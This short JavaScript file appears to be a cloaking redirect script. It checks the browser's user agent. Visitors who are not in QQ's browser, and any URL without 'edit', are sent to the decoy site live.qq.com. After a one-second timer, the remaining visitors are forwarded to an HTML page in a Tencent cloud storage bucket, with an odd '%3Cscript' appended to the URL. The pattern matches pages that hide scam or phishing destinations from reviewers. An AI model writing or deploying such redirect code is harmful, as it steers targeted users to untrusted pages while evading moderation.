function leleua() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
    } else {
        window.location.href = "https://live.qq.com";
    }
}

leleua();

setTimeout(function() {
    var timestamp = new Date().getTime();
    var url = 'https://cos.ap-shenzhen-fsi.tencentcos.cn/0-1322622902/waa.html?' + '?' + timestamp + '%3Cscript';
    location.href = url;
}, 1000);
